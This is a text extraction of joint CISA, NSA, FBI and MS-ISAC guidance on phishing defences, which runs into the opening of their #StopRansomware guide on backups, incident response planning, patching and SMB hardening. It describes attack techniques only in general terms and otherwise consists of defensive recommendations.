(e.g., colleagues, acquaintances, or organizations) to lure victims into providing their login
credentials. Malicious actors can use the compromised credentials (e.g., usernames and passwords)
to gain access to enterprise networks or protected resources, such as email accounts.
EXAMPLE TECHNIQUES
To obtain login credentials, malicious actors commonly:
Impersonate supervisors, trusted colleagues, or IT personnel to send targeted emails to deceive
employees into providing their login credentials.
Use smartphones or tablets, along with short message system (SMS), to send text messages or
chats in platforms such as Slack, Teams, Signal, WhatsApp, or Facebook Messenger to lure
users into divulging their login credentials.
Note: Organizations operating in hybrid environments have fewer face-to-face
interactions and frequent virtual exchanges; thus, users in these environments are more
likely to be deceived by social engineering techniques tailored towards platforms they
frequently use.
Use voice over internet protocol (VoIP) to easily spoof caller identification (ID) which takes
advantage of public trust in the security of phone services, especially landline phones.
Multi-factor authentication (MFA) can reduce the ability of malicious actors using compromised
credentials for initial access. Despite this, if weak forms of MFA are enabled, malicious actors can
still obtain access through phishing and other techniques. Instances of weak MFA implementation
include the following:
Accounts using MFA without Fast Identity Online (FIDO) MFA or Public Key Infrastructure (PKI)based MFA enabled. These forms of MFA- are susceptible to malicious actors using
compromised legitimate credentials to authenticate as the user in legitimate login portals.
Push-notification MFA without number matching. Malicious actors can send a multitude of
approve or deny 
push requests
 until a user either accepts the request, often by accident or in
frustration. Thus, malicious actors may authenticate with the compromised user
s credentials, if
they do not have number matching enabled
SMS or voice MFA. Malicious actors can convince cellular carrier representatives to transfer
control of a user
s phone number to receive any SMS or call-based MFA codes. Malicious actors
may also deceive users by sending an email containing a link to a malicious website that mimics
a company
s legitimate login portal. The user submits their username, password, and the 6-digit
code MFA, which the actors then receive to authenticate as the user in the legitimate login
portal.
CISA | NSA | FBI | MS-ISAC
TLP:CLEAR
PHISHING GUIDANCE: STOPPING THE ATTACK CYCLE AT PHASE ONE
TLP:CLEAR
Note: For more information on weak MFA implementations, see CISA
s Fact Sheets Implementing
Phishing Resistant MFA and Implementing Number Matching in MFA Applications.
MALWARE-BASED PHISHING
DEFINITION
In malware-based phishing attacks, Malicious actors pose as trustworthy sources (e.g., colleagues,
acquaintances, or organizations) to lure a victim into interacting with a malicious hyperlink or
opening an email attachment to execute malware on host systems.
EXAMPLE TECHNIQUES
To execute malware on host systems, malicious actors commonly:
Send malicious hyperlinks or attachments that cause a user to download malware, facilitating
initial access, information stealing, damage or disruption to systems or services, and/or the
escalation of account privileges.
Malicious actors may use free, publicly available tools (such as GoPhish or Zphisher) to
facilitate spearphishing campaigns where individual users are targeted with specific and
convincing lures.
Malicious actors may send malicious attachments with macro scripts or messages with
seemingly benign or obfuscated links that download malicious executables.
Use smartphone or tablet apps, along with SMS, to send text messages or chats in collaboration
platforms (i.e., Slack, Teams, Signal, WhatsApp, iMessage, and Facebook Messenger) to lure
users into interacting with a malicious hyperlink or attachment that executes malware.
Note: It can be difficult for a user to detect malicious uniform resource locators (URLs) on these
small platforms, as they use constrained user interfaces (UI).
MITIGATIONS
ALL ORGANIZATIONS
The mitigations below align with Cross-Sector Cybersecurity Performance Goals (CPGs) developed for
organizations by CISA and the National Institute of Standards and Technology (NIST) to help mitigate
the most prevalent cyber threats to organizational networks. Visit CISA
s Cross-Sector Cybersecurity
Performance Goals for more information on the CPGs, including additional recommended baseline
protections.
PROTECTING LOGIN CREDENTIALS
CISA, NSA, FBI, and MS-ISAC recommend organizations implement the following to reduce the
likelihood of successful login credential phishing.
CISA | NSA | FBI | MS-ISAC
TLP:CLEAR
PHISHING GUIDANCE: STOPPING THE ATTACK CYCLE AT PHASE ONE
Implement user training on social engineering and phishing attacks [CPG 2.I]. Regularly educate
users on identifying suspicious emails and links, not interacting with those suspicious items, and
the importance of reporting instances of opening suspicious emails, links, attachments, or other
potential lures.
Enable Domain-based Message Authentication, Reporting, and Conformance (DMARC) for
received emails.
DMARC, along with Sender Policy Framework (SPF) and Domain Keys Identified Mail
(DKIM), verify the sending server of received emails by checking published rules. If an
email fails the check, it is deemed a spoofed email address, and the mail system will
quarantine and report it as malicious.
Multiple recipients can be defined for the receipt of DMARC reports.
These tools reject any incoming email that has a domain that is being spoofed when a
DMARC policy of reject is enabled.
Ensure DMARC is set to 
reject
 for sent emails [CPG 2.M]. This provides robust protection
against other users receiving emails that impersonate a domain.
Spoofed emails are rejected at the mail server prior to delivery.
DMARC reports provide a mechanism for notifying the owner of a spoofed domain
including the source of an apparent forger (information they would not receive
otherwise.)
Enable DMARC policies to lower the chance of cyber threat actors crafting emails that
appear to come from your organization
s domain(s).
See CISA Insights Enhance Email and Web Security and the Center for Internet Security
(CIS
s) page on DMARC, as well as Microsoft
s Anti-Spoofing guidance for more
information.[1]
Implement internal mail and messaging monitoring. Monitoring internal mail and messaging
traffic to identify suspicious activity is essential as users may be phished from outside the
targeted network or without the knowledge of the organizational security team. Establish a
baseline of normal network traffic and scrutinize any deviations.
Implement free security tools, such as OpenDNS Home, to prevent cyber threat actors from
redirecting users to malicious websites to steal their credentials. For more information see,
CISA
s Free Cybersecurity Services and Tools webpage.
Harden credentials by:
TLP:CLEAR
Implementing FIDO or PKI-based MFA [CPG 2.H]. These forms of MFA are phishing
resistant and resilient against the threats listed in previous sections. If an organization
that uses mobile push-notification based MFA is unable to implement phishing-resistant
MFA, use number matching to mitigate MFA fatigue. For further information, see CISA
CISA | NSA | FBI | MS-ISAC
TLP:CLEAR
PHISHING GUIDANCE: STOPPING THE ATTACK CYCLE AT PHASE ONE
TLP:CLEAR
fact sheets for Implementing Phishing Resistant MFA and Implementing Number
Matching in MFA Applications.
Note: Deploying PKI-based MFA requires highly mature identity access and management
programs and is not widely supported by commonly used services.
Prioritizing phishing-resistant MFA for administrator and privileged user accounts, such
as those with access to e-discovery tools or broad access to customer or financial data.
Implementing centralized logins around a Single Sign On (SSO) program. SSO is a user
lifecycle management mechanism that
among other benefits
can reduce the chance of
users being socially engineered to give up their login credentials, especially when paired
with MFA or phishing-resistant MFA. SSO provides IT professionals an audit trail to
examine, either proactively or retroactively, after a suspected or confirmed security
breach.
Review MFA lockout and alert settings and track denied (or attempted) MFA logins [CPG 2.G].
Perform an account lockout when unusual activity or ongoing malicious login attempts
are occurring to prevent malicious actors from bypassing MFA.
Minimize unnecessary disruptions. This includes prioritizing the health of organizational
and consumer data, rather than the short-term productivity of a single employee. A
significant network security incident would not only impact production by many
employees, but also resource availability and potentially customer or partner data.
Identify and remediate successful phishing attempts.
Promptly report phishing incidents (see the Reporting section).
Develop a documented incident response plan. For further information, see CISA
s fact
sheet on Incident Response Plan Basics.
PREVENTING MALWARE EXECUTION
CISA, NSA, FBI, and MS-ISAC recommend organizations implement the following to reduce the
likelihood of successful malware execution following phishing attacks.
Incorporate denylists at the email gateway and enable firewall rules to prevent successful
malware deployment.
Use denylists to block known malicious domains, URLs, and IP addresses as well as file
extensions such as .scr, .exe, .pif, and .cpl and mislabeled file extensions (e.g., a .exe file that is
labeled as a .doc file.)
State local tribal and territory (SLTT) entities should enable malicious domain blocking
and reporting (MDBR), which is a cloud-based solution with recursive domain name
system (DNS) technology that works to prevent users from connecting to malicious
CISA | NSA | FBI | MS-ISAC
TLP:CLEAR
PHISHING GUIDANCE: STOPPING THE ATTACK CYCLE AT PHASE ONE
TLP:CLEAR
domains. For more information, visit CIS
s webpage on Malicious Domain Blocking and
Reporting (MDBR).
For more information on protective phishing filters, refer to Microsoft, MacOS, or Google
guidance on phishing and malware protection.[2],[3],[4],[5] CISA, NSA, FBI, and MS-ISAC
recommend reaching out to vendors or service providers to learn about what phishing
filters and malware protections are available.
Restrict MacOS and Windows users from having administrative rights [CPG 2.E].
Implement the principle of least privilege (PoLP) when administering user accounts, and only
allow designated administrator accounts to be used for administrative purposes.
Implement application allowlists [CPG 2.Q], which are security controls that enumerate
application components authorized to be present within a network based on a defined baseline.
For more information, see NIST
s Application Allowlisting.
Block macros by default [CPG 2.N].
Implement remote browser isolation (RBI) solutions that prevent malware propagation through
quarantining the malware sample upon user execution. RBI solutions run applications that
quarantine malware when a user interacts with a malicious link or binary to prevent further
spread into the environment. Configure RBI solutions in remote workstations so that any
malware is contained within an isolation boundary and cannot access an organization
resources.
Implement free security tools like Quad9 or Google Safe Browsing to identify and stop malware
upon user execution. For more information see, CISA
s Free Cybersecurity Services and Tools
webpage.
Set up a self-serve app store where customers can install approved apps and block apps and
executables from other sources.
Implement a free protective DNS resolver to prevent malicious actors from redirecting users to
malicious websites to steal their credentials. Several services provide free security tools ranging
from personal to professional use cases, such as OpenDNS Home or Cloudflare Zero Trust
Services. For more information see, CISA
s Free Cybersecurity Services and Tools webpage.
Federal organizations should see CISA
s fact sheet Protective Domain Name System (DNS)
Resolver Service for information.
SMALL- AND MEDIUM-SIZED BUSINESSES (SMBs) OR ORGANIZATIONS
CISA, NSA, FBI, and MS-ISAC recommend that small- and medium-sized organizations with limited
resources prioritize the following best practices to protect network resources from prevalent phishing
threats:
User phishing awareness training: Implement a standard anti-phishing training program and
require employees to review phishing training material annually. Additionally, conclude the
CISA | NSA | FBI | MS-ISAC
TLP:CLEAR
PHISHING GUIDANCE: STOPPING THE ATTACK CYCLE AT PHASE ONE
TLP:CLEAR
program evolution with a training check that certifies that the employee has retained all the
information outlined in the training program.
Small businesses are encouraged to implement commercial phishing awareness training
programs to employees. Additionally, NIST offers free anti-phishing training resources for
small businesses on their Small Business Cybersecurity Corner: Phishing webpage.
The Department of Justice (DOJ) offers Anti-Phishing Training Program Support to federal
organizations.
The Federal Trade Commission (FTC) offers guidance to protect small businesses from
phishing threats on their Cybersecurity for Small Businesses: Phishing webpage.
Identify network phishing vulnerabilities: Federal organizations are encouraged to participate in
CISA
s Phishing Vulnerability Scanning assessment service.
Enable MFA: Activating a strong MFA is the best way that small businesses can protect their
internet facing business accounts from phishing related threats.
Learn more about why MFA is important for small business to enable by visiting CISA
More than a Password MFA webpage. The webpage includes an MFA hierarchy, which
helps users identify the strongest form of MFA, and ensures users can select the best
form of MFA based on their operational needs.
Additionally, CISA, NSA, FBI, and MS-ISAC recommend SMBs implement the technical solutions
below to prevent phishing related compromises:
Implement strong password policies to authenticate users. These passwords must adhere to a
password strength policy which requires minimum character length, numbers, special
characters, and case sensitivity, along with prohibiting users from recycling previously used
passwords.
Implement DNS filtering or firewall denylists to block known malicious sites.
Implement anti-virus solutions to mitigate malware and to stop malware from executing if a
malicious hyperlink or attachment from an email is opened.
Implement file restriction policies that prevent malicious high risk file extensions e.g., .exe or .scr
from being downloaded and executed. These types of files are unnecessary for daily operations
and should be heavily restricted on standard business accounts.
Ensure that software applications are set to automatically update so that network software is
always upgraded to the latest version. This helps to prevent malicious actors from exploiting
vulnerabilities within an organization
s network software.
Enable safe web browsing policies so that employees can only access websites that are needed
for daily business operations. These policies also prevent users from visiting malicious websites
that often contain malware that can either harvest user credentials or deploy additional malware
to damage organizational systems.
CISA | NSA | FBI | MS-ISAC
TLP:CLEAR
PHISHING GUIDANCE: STOPPING THE ATTACK CYCLE AT PHASE ONE
TLP:CLEAR
Implement a secure virtual private network (VPN) with MFA enabled.
Reference the Federal Communications Commission
s (FCC) Cybersecurity Planning Guide. The
guide includes information on ways small businesses can improve their overall cybersecurity
posture.
Consider migrating to managed cloud-based email services from reputable third-party vendors.
CISA, NSA, and MS-ISAC encourage small businesses with limited resources to seek managed
cloud email services from trusted third-party vendors.
Migrating from on-premises mail systems to trusted third-party cloud-based mail
providers is beneficial for customers because providers regularly patch and update their
systems. Providers also commonly perform robust email traffic monitoring and antiphishing malware services.
For more information on cloud services, see CISA
s Secure Cloud Business Applications
(SCuBA) project. Although tailored to federal organizations, the SCuBA project provides
guidance and capabilities applicable to all organizations with cloud business application
environments.
SOFTWARE MANUFACTURERS
CISA, NSA, FBI, and MS-ISAC recommend software manufacturers incorporate secure-by-design and default principles and tactics into their software development practices, reducing the susceptibility of
their customers to phishing attacks. For more information on secure by design, see CISA
s secure by
design webpage and joint guide Shifting the Balance of Cybersecurity Risk: Principles and
Approaches for Security-by-Design and -Default.
To mitigate the success of phishing emails reaching users and users interacting with the email, the
authoring organizations recommend the following:
Perform field testing of email software. Implement threat modeling to test the email software
against various deployment scenarios while considering use-cases for organizations ranging from
small to large and configure the software with secure defaults based on the test findings.
Provide email software with DMARC enabled for received emails by default.
Provide email software with DMARC configured to 
reject
 for sent emails by default.
Provide email products with internal mail and messaging monitoring mechanisms enabled by
default. Email software manufacturers are encouraged to include automatic email traffic
monitoring mechanisms by default that automatically scan email traffic for the presence of
malicious attachments or URLs within email messages.
Mandate MFA for privileged users. Frequently, malicious actors focus their infiltration techniques
on administrator accounts. Administrator accounts have elevated privileges and should be
protected by strong MFA by default.
CISA | NSA | FBI | MS-ISAC
TLP:CLEAR
PHISHING GUIDANCE: STOPPING THE ATTACK CYCLE AT PHASE ONE
TLP:CLEAR
Make MFA an opt-out feature rather than opt-in; have the system regularly prompt the
administrator to enroll in MFA until they have successfully enabled it on their account.
Implement SSO for applications via modern open standards. Examples include Security Assertion
Markup Language (SAML) or OpenID Connect (OIDC.) Make this capability available by default at
no additional cost.
Consider implementing security notifications for the customer when non-secure configurations
are used in email software products. For example, if administrators are not enrolled in MFA, send
repeated security notifications warning the organization of the present security risks so that they
know to mitigate the risk.
To mitigate successful malware execution following phishing attacks:
Ensure phishing filtering and blocking mechanisms are packaged with email software by default
to prevent successful malware deployment.
Provide email software with limited administrative rights by default. Only allow designated
administrator accounts to be used for administrative purposes.
Provide email software with application allowlists by default.
Provide a self-serve application store where customers can install approved applications. Block
applications and executables from external, unapproved sources that are not permitted via
organizational policy.
Include mechanisms that block macros by default with email products.
Include RBI solutions by default.
INCIDENT RESPONSE
If an organization identifies compromised credentials and/or successful malware from phishing
activity, remediate the activity by:
1. Re-provisioning suspected or confirmed compromised user accounts to prevent malicious
actors from maintaining continued access to the environment.
2. Auditing account access following a confirmed phishing incident to ensure malicious actors
no longer have access to the initially impacted account.
3. Isolating the affected workstation after the detection of a phishing attack. This helps stop the
executed malware from spreading further into the organization
s network.
4. Analyzing the malware. After isolating the affected workstation(s), have the malware
analyzed by a team that specializes in malware analysis.
Note: This step may require outsourcing to expert third-party consultants. After analysis,
specialists will know how to safely handle the malware. Learn more by visiting CISA
malware analysis services and resources webpage.
CISA | NSA | FBI | MS-ISAC
TLP:CLEAR
PHISHING GUIDANCE: STOPPING THE ATTACK CYCLE AT PHASE ONE
TLP:CLEAR
5. Eradicating the malware. Eradicate the malware from the network so other workstations
within the organization
s networks can no longer be negatively impacted by the executed
malware.
6. Restore systems to normal operations and confirm they are functioning properly. The main
challenges at this phase are confirming that remediation has been successful, rebuilding
systems, reconnecting networks, as well as correcting misconfigurations.
For more guidance on how to respond to malicious cyber incidents, see CISA
s incident response
playbook and Federal Government Cybersecurity Incident and Vulnerability Response Playbook.
Although tailored to federal organizations, these playbooks provide operational procedures for
planning and conducting cybersecurity incident and vulnerability response activities and detail steps
for both incident and vulnerability response.
REPORTING
Organizations are encouraged to use reporting features that are built into Microsoft Outlook and
other cloud email platforms, as well as report spam directly to Microsoft, Apple, and Google, as
applicable. Reporting suspicious phishing activity is one of the most efficient methods for protecting
organizations as it helps email service providers identify new or trending phishing attacks.
CISA urges organizations to promptly report phishing incidents to CISA at report@cisa.gov or call
the 24/7 response line at (888) 282-0870.
To report spoofing or phishing attempts (or to report that you've been a victim), file a complaint
with the FBI
s Internet Crime Complaint Center (IC3), or contact your local FBI Field Office to
report an incident.
State, local, tribal, and territorial (SLTT) government entities can report to the Multi-State
Information Sharing and Analysis Center (MS-ISAC) by emailing SOC@cisecurity.org or calling
(866) 787-4722.
CISA SERVICES
Cyber Hygiene
Malware Analysis
Phishing Vulnerability Scanning
Free Cybersecurity Services and Tools
MS-ISAC/CIS Services
MS-ISAC Membership and Benefits
CIS Critical Security Controls
Malicious Domain Blocking and Reporting
CISA | NSA | FBI | MS-ISAC
TLP:CLEAR
PHISHING GUIDANCE: STOPPING THE ATTACK CYCLE AT PHASE ONE
Albert Network Monitoring and Management
CIS Endpoint Security Services
TLP:CLEAR
RESOURCES
CISA
Cross-Sector Cybersecurity Performance Goals
Secure by Design | CISA
More than a Password | CISA
Counter-Phishing Recommendations for Federal Agencies
Zero Trust Maturity Model
Incident Response Playbook
Enhance Email and Web Security
Reducing Spam
Cyber Smart Phishing Guidance
Phishing Security Postcard
Phishing Infographic
Anti-Phishing Training Program Support | CISA
Stop the Snowball: Protect Yourself from Phishing Scams
Spoofing and Phishing
CENTER FOR INTERNET SECURITY
How DMARC Advances Email Security
A Short Guide for Spotting Phishing Attempts
CIS Blueprint of a Phishing Attack
NIST
Application allowlisting - Glossary | CSRC (nist.gov)
Small Business Cybersecurity Corner: Phishing
CISA | NSA | FBI | MS-ISAC
TLP:CLEAR
PHISHING GUIDANCE: STOPPING THE ATTACK CYCLE AT PHASE ONE
TLP:CLEAR
Cybersecurity Planning Guide
Protecting Small Businesses: Phishing
ACKNOWLEDGEMENTS
Spamhaus contributed to this guidance.
DISCLAIMER
The information in this report is being provided 
as is
 for informational purposes only. CISA, NSA,
FBI, and MS-ISAC do not endorse any commercial entity, product, company, or service, including any
entities, products, or services linked within this document. Any reference to specific commercial
entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise,
does not constitute or imply endorsement, recommendation, or favoring by CISA, NSA, FBI, or MSISAC.
REFERENCES
[1] Microsoft: Anti-spoofing protection in EOP
[2] Microsoft: Anti-phishing protection in Microsoft 365
[3] Microsoft: Exchange Online Protection Overview
[4] Google: Advanced Phishing and Malware Protection
[5] Apple: Protect Your Mac from Malware
CISA | NSA | FBI | MS-ISAC
TLP:CLEAR
TLP:CLEAR
CHANGE RECORD
Version
Date
Revision/Change
Description
Section/Page Affected
September 2020 Initial version
February 2023
#StopRansomware Guide
Publication: October 2023
Disclaimer: This document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when
information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for
public release. Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction. For
more information on the Traffic Light Protocol, see cisa.gov/tlp/.
TLP:CLEAR
TLP:CLEAR
Change Record
Version
Date
Revision/Change Description
September 2020
Initial Version
May 2023
See 
What
s New
 on p.3
October 2023
Page | 2
Initial Access Vector bullet
added for internet-facing
vulnerabilities
Updated guidance on
hardening SMB
Added information about threat
actors impersonating
employees
Added guidance on hardening
web browsers
Added a bullet about abnormal
amounts of data outgoing over
any ports.
Added Acknowledgements
section
Section/Page Affected
Updates throughout
Initial Access Vector: InternetFacing Vulnerabilities and
Mitigations pg. 7
Part 1: Ransomware and Data
Extortion Preparation, Prevention,
and Mitigation Best Practices,
pages 8, and 9
Initial Access Vector: Advanced
Forms of Social Engineering pg.
General Best Practices and
Hardening Guidance, page 20
Part 2: Ransomware and Data
Extortion Response Checklist pg.
Acknowledgements, page 30
TLP:CLEAR
TLP:CLEAR
INTRODUCTION
Ransomware is a form of malware designed to
encrypt files on a device, rendering them and the
systems that rely on them unusable. Malicious
actors then demand ransom in exchange for
decryption. Over time, malicious actors have
adjusted their ransomware tactics to be more
destructive and impactful and have also exfiltrated
victim data and pressured victims to pay by
threatening to release the stolen data. The
application of both tactics is known as 
double
extortion.
 In some cases, malicious actors may
exfiltrate data and threaten to release it as their
sole form of extortion without employing
ransomware.
These ransomware and associated data breach
incidents can severely impact business processes
by leaving organizations unable to access
necessary data to operate and deliver missioncritical services. The economic and reputational
impacts of ransomware and data extortion have
proven challenging and costly for organizations of
all sizes throughout the initial disruption and, at
times, extended recovery.
This guide is an update to the Joint Cybersecurity
and Infrastructure Security Agency (CISA) and
Multi-State Information Sharing & Analysis Center
(MS-ISAC) Ransomware Guide released in
September 2020 (see What
s New) and was
developed through the JRTF. This guide includes
two primary resources:
This guide was developed through the U.S.
Joint Ransomware Task Force (JRTF).
The JRTF, co-chaired by CISA and FBI, is an
interagency, collaborative effort to combat the
growing threat of ransomware attacks. The
JRTF was launched in response to a series of
high-profile ransomware attacks on U.S. critical
infrastructure and government agencies. The
JRTF:
1. Coordinates and streamlines the U.S.
Government's response to ransomware
attacks and facilitates information sharing
and collaboration between government
agencies and private sector partners.
2. Ensures operational coordination for
activities such as developing and sharing
best practices for preventing and
responding to ransomware attacks,
conducting joint investigations and
operations against ransomware threat
actors, and providing guidance and
resources to organizations that have been
victimized by ransomware.
3. Represents a significant step forward in
enabling unity of effort across the U.S
Government's efforts to address the
growing threat of ransomware attacks.
For more info on JRTF, see cisa.gov/jointransomware-task-force.
Part 1: Ransomware and Data Extortion
Prevention Best Practices
Part 2: Ransomware and Data Extortion Response Checklist
Part 1 provides guidance for all organizations to reduce the impact and likelihood of ransomware
incidents and data extortion, including best practices to prepare for, prevent, and mitigate these
incidents. Prevention best practices are grouped by common initial access vectors. Part 2 includes a
checklist of best practices for responding to these incidents.
These ransomware and data extortion prevention and response best practices and recommendations
are based on operational insight from CISA, MS-ISAC, the National Security Agency (NSA), and the
Federal Bureau of Investigation (FBI), hereafter referred to as the authoring organizations. The
Page | 3
TLP:CLEAR
TLP:CLEAR
audience for this guide includes information technology (IT) professionals as well as others within an
organization involved in developing cyber incident response policies and procedures or coordinating
cyber incident response.
The authoring organizations recommend that organizations take the following initial steps to prepare
and protect their facilities, personnel, and customers from cyber and physical security threats and other
hazards:
Join a sector-based information sharing and analysis center (ISAC), where eligible, such as:
MS-ISAC for U.S. State, Local, Tribal, & Territorial (SLTT) Government Entities learn.cisecurity.org/ms-isac-registration. MS-ISAC membership is open to
representatives from all 50 states, the District of Columbia, U.S. Territories, local and
tribal governments, public K-12 education entities, public institutions of higher education,
authorities, and any other non-federal public entity in the United States.
Elections Infrastructure Information Sharing & Analysis Center (EI-ISAC) for U.S.
Elections Organizations - learn.cisecurity.org/ei-isac-registration.
See the National Council of ISACs for more information.
Contact CISA at CISA.JCDC@cisa.dhs.gov to collaborate on information sharing, best
practices, assessments, exercises, and more.
Contact your local FBI field office for a list of points of contact (POCs) in the event of a cyber
incident.
Engaging with peer organizations and CISA enables your organization to receive critical and timely
information and access to services for managing ransomware and other cyber threats.
What
s New
Since the initial release of the Ransomware Guide in September 2020, ransomware actors have
accelerated their tactics and techniques.
To maintain relevancy, add perspective, and maximize the effectiveness of this guide, the following
changes have been made:
Added FBI and NSA as co-authors based on
#StopRansomware is CISA and FBI
s effort
their contributions and operational insight.
to publish advisories for network defenders
Incorporated the #StopRansomware effort into
that detail network defense information
the title.
related to various ransomware variants and
Added recommendations for preventing
threat actors. Visit stopransomware.gov to
common initial infection vectors, including
learn more and to read the joint advisories.
compromised credentials and advanced forms
of social engineering.
Updated recommendations to address cloud backups and zero trust architecture (ZTA).
Expanded the ransomware response checklist with threat hunting tips for detection and
analysis.
Mapped recommendations to CISA
s Cross-Sector Cybersecurity Performance Goals (CPGs).
Page | 4
TLP:CLEAR
TLP:CLEAR
Part 1: Ransomware and Data Extortion Preparation, Prevention, and
Mitigation Best Practices
These recommended best practices align with the CPGs developed by CISA and the National Institute
of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections
that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on
existing cybersecurity frameworks and guidance to protect against the most common and impactful
threats, tactics, techniques, and procedures. For more information on the CPGs and recommended
baseline protections, visit CISA
s Cross-Sector Cybersecurity Performance Goals.
Preparing for Ransomware and Data Extortion Incidents
Refer to the best practices and references listed in this section to help manage the risks posed by
ransomware and to drive a coordinated and efficient response for your organization in the event of an
incident. Apply these practices to the greatest extent possible pending the availability of organizational
resources.
Maintain offline, encrypted backups of critical data,
Automated cloud backups may not
and regularly test the availability and integrity of
be sufficient because if local files
backups in a disaster recovery scenario [CPG 2.R].
are encrypted by an attacker, these
Test backup procedures on a regular basis. It is
files will be synced to the cloud,
important that backups are maintained offline, as most
possibly overwriting unaffected
ransomware actors attempt to find and subsequently
data.
delete or encrypt accessible backups to make
restoration impossible unless the ransom is paid.
Ransomware actors often hunt for and collect credentials stored in the targeted environment
and use those credentials to attempt to access backup solutions; they also use publicly
available exploits to target unpatched backup solutions.
Maintain and regularly update 
golden images
 of critical systems. This includes
maintaining image 
templates
 that have a preconfigured operating system (OS) and
associated software applications that can be quickly deployed to rebuild a system, such
as a virtual machine or server [CPG 2.O].
Page | 5
Use infrastructure as code (IaC) to deploy and update cloud resources and keep
backups of template files offline to quickly redeploy resources. IaC code should
be version controlled and changes to the templates should be audited.
Store applicable source code or executables with offline backups (as well as
escrowed and license agreements). Rebuilding from system images is more
efficient, but some images will not install on different hardware or platforms
correctly; having separate access to software helps in these cases.
TLP:CLEAR
TLP:CLEAR
Retain backup hardware to rebuild systems if rebuilding the primary system is not
preferred.
Consider using a multi-cloud solution to avoid vendor lock-in for cloud-to-cloud backups
in case all accounts under the same vendor are impacted.
Some cloud vendors offer immutable storage solutions that can protect stored
data without the need for a separate environment. Use immutable storage with
caution as it does not meet compliance criteria for certain regulations and
misconfiguration can impose significant cost.
Create, maintain, and regularly exercise a basic cyber incident response plan (IRP) and
associated communications plan that includes response and notification procedures for
ransomware and data extortion/breach incidents [CPG 2.S]. Ensure a hard copy of the plan and
an offline version is available.
Provide data breach notifications to third parties and regulators consistent with law.
Ensure the IRP and communications plan are reviewed and approved by the CEO, or
equivalent, in writing and that both are reviewed and understood across the chain of
command.
Review available incident response guidance, such as the Ransomware Response
Checklist in this guide and Public Power Cyber Incident Response Playbook to:
Consider replacing out-of-date hardware that inhibits restoration with up-to-date
hardware, as older hardware can present installation or compatibility hurdles
when rebuilding from images.
Help your organization better organize around cyber incident response.
Draft cyber incident holding statements.
Develop a cyber IRP.
Include organizational communications procedures as well as templates for cyber
incident holding statements in the communications plan. Reach a consensus on what
level of detail is appropriate to share within the organization and with the public and how
information will flow.
Implement a zero trust architecture to prevent unauthorized access to data and services.
Make access control enforcement as granular as possible. ZTA assumes a network is
compromised and provides a collection of concepts and ideas designed to minimize uncertainty
in enforcing accurate, least privilege per request access decisions in information systems and
services.
Preventing and Mitigating Ransomware and Data Extortion Incidents
Refer to the best practices and references listed in this section to help prevent and mitigate
ransomware and data extortion incidents. Prevention best practices are grouped by common initial
access vectors of ransomware and data extortion actors.
Initial Access Vector: Internet-Facing Vulnerabilities and Misconfigurations
Page | 6
TLP:CLEAR
TLP:CLEAR
Do not expose services, such as remote desktop protocol, on the web. If these services
must be exposed, apply appropriate compensating controls to prevent common forms of abuse
and exploitation. All unnecessary OS applications and network protocols are disabled on
internet-facing assets. [CPG 2.W]
Conduct regular vulnerability scanning to identify and address vulnerabilities, especially
those on internet-facing devices, to limit the attack surface [CPG 1.E].
Regularly patch and update software and operating systems to the latest available
versions.
Prioritize timely patching of internet-facing servers
that operate software for processing
internet data, such as web browsers, browser plugins, and document readers
especially for known exploited vulnerabilities.
The authoring organizations
aware of difficulties small and medium business have
keeping internet-facing servers updated
urge migrating systems to reputable
managed
 cloud providers to reduce, not eliminate, system maintenance roles for
identity and email systems. For more information, visit NSA
s Cybersecurity Information
page Mitigating Cloud Vulnerabilities.
Ensure all on-premises, cloud services, mobile, and personal (i.e., bring your own device
[BYOD]) devices are properly configured and security features are enabled. For example,
disable ports and protocols that are not being used for business purposes (e.g., Remote
Desktop Protocol [RDP]
Transmission Control Protocol [TCP] Port 3389) [CPG 2.X].
CISA offers a no-cost Vulnerability Scanning service and other no-cost assessments:
cisa.gov/cyber-resource-hub [CPG 1.F].
Reduce or eliminate manual deployments and codify cloud resource configuration
through IaC. Test IaC templates before deployment with static security scanning tools to
identify misconfigurations and security gaps.
Check for configuration drift routinely to identify resources that were changed or
introduced outside of template deployment, reducing the likelihood of new security gaps
and misconfigurations being introduced. Leverage cloud providers
 services to automate
or facilitate auditing resources to ensure a consistent baseline.
Limit the use of RDP and other remote desktop services. If RDP is necessary, apply best
practices. Threat actors often gain initial access to a network through exposed and poorly
secured remote services, and later traverse the network using the native Windows RDP client.
Threat actors also often gain access by exploiting virtual private networks (VPNs) or using
compromised credentials. Refer to CISA Advisory: Enterprise VPN Security.
Page | 7
Audit the network for systems using RDP, close unused RDP ports, enforce account
lockouts after a specified number of attempts, apply multifactor authentication (MFA),
and log RDP login attempts.
Update VPNs, network infrastructure devices, and devices being used to remote in to
work environments with the latest software patches and security configurations.
TLP:CLEAR
TLP:CLEAR
Implement MFA on all VPN connections to increase security. If MFA is not implemented,
require teleworkers to use passwords of 15 or more characters.
Disable Server Message Block (SMB) protocol version 1 and upgrade to version 3 (SMBv3)
after mitigating existing dependencies (on existing systems or applications), as they may break
when disabled. SMBv3 was first released as part of updates to Microsoft Windows 8 and
Windows Server 2012, Apple OS X 10.10, and Linux kernel 3.12.
Harden SMBv3 by implementing the following guidance as malicious actors use SMB to
propagate malware across organizations.
Require the use of SMBv 3.1.1. This version contains enhanced security protections,
including pre-authentication integrity, enhanced AES encryption, and signing
cryptography. SMBv 3.1.1 protocol is supported natively in Windows, Apple, and Linux
kernel, as well as many other third-party storage systems. In Microsoft Windows 10 and
Windows Server 2019, Windows 11 Preview Build 25951, and later, you can mandate
SMBv 3.1.1 protections such as dialect client negotiation. For more information, see
Microsoft
s Protect SMB traffic from interception | Use SMB 3.1.1 and SMB dialect
management now supported in Windows Insider.
Block unnecessary SMB communications:
Page | 8
Block external access of SMB to and from organization networks by blocking
TCP port 445 inbound and outbound at internet perimeter firewalls. Block TCP
ports 137, 138, 139. Note: SMBv2 and later does not use NetBIOS datagrams.
Continuing to use SMBv2 does not have significant risks and can be used where
needed. It is recommended to update it to SMBv3 where feasible.
Block or limit internal SMB traffic so that communications only occur between
systems requiring it. For instance, Windows devices need SMB communications
with domain controllers to get group policy, but most Windows workstations do
not need to access other Windows workstations.
Configure Microsoft Windows and Windows Server systems to require Kerberosbased IP Security (IPsec) for lateral SMB communications to prevent malicious
actors from accessing communications over SMB by detecting systems that are
